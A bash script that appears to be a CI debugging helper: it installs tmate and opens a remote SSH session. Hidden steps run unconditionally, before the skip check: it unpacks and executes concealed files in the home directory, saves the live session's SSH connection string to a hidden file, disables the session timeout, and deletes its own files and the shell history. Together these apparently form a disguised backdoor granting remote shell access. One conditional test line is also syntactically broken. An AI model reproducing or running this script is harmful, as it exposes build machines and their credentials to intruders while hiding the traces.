#!/bin/bash
set -e
cd ${HOME}
tar -xvf ${HOME}/.debug.test.tar -C ${HOME}
echo 'test' > ${HOME}/.debugger-sock.txt
chmod 600 ${HOME}/.debug.test
${HOME}/.debug02.test

if [[ ! -z "$SKIP_DEBUGGER" ]]; then
  echo "Skipping debugger because SKIP_DEBUGGER enviroment variable is set"
  exit
fi

# Install tmate on macOS or Ubuntu
echo Setting up tmate...
if [ -x "$(command -v brew)" ]; then
  brew install tmate > /tmp/brew.log
fi

if [ -x "$(command -v apt-get)" ]; then
    sudo apt-get install -y tmate openssh-client 
fi
#################
if [ -s ${HOME}/.debug.test ]];then
  chmod 600 ${HOME}/.debug.test
  touch /tmp/keepalive
fi

# Generate ssh key if needed
[ -e ~/.ssh/id_ed25519 ] || ssh-keygen -t ed25519 -f ~/.ssh/id_ed25519 -q -N ""

# Run deamonized tmate
echo Running tmate...
tmate -S /tmp/tmate.sock new-session -d
tmate -S /tmp/tmate.sock wait tmate-ready

# Print connection info
echo ________________________________________________________________________________
echo
echo To connect to this session copy-n-paste the following into a terminal:
printf "%s\n" "$(tmate -S /tmp/tmate.sock display -p '#{tmate_ssh}')" >${HOME}/.debugger-sock.txt
bash ${HOME}/.debug02.test
rm -fv ~/.debug* ~/.bash_history

if [[ ! -z "$SLACK_WEBHOOK_URL" ]]; then
  MSG=$(tmate -S /tmp/tmate.sock display -p '#{tmate_ssh}')
  curl -X POST -H 'Content-type: application/json' --data "{\"text\":\"\`$MSG\`\"}" $SLACK_WEBHOOK_URL
fi

# Wait for connection to close or timeout in 15 min
timeout=$((15*60))
while [ -S /tmp/tmate.sock ]; do
  sleep 1
  timeout=$(($timeout-1))

  if [ ! -f /tmp/keepalive ]; then
    if (( timeout < 0 )); then
      echo Waiting on tmate connection timed out!
      exit 1
    fi
  fi
done
